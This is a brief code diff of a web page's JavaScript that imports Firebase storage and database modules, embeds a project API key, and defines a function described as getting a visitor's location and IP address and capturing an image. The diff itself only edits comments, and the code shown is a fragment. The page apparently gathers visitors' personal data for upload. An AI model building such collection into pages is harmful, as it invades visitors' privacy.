@@ -24,7 +24,7 @@
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
 
-        // Firebase configuration (replace with your own)
+        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
             authDomain: "html-7fd9b.firebaseapp.com",
@@ -53,6 +53,7 @@
 
         // Function to get location, IP address, and capture image
         async function getLocationAndIP() {
+            // Get the user's location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     const latitude = position.coords.latitude;
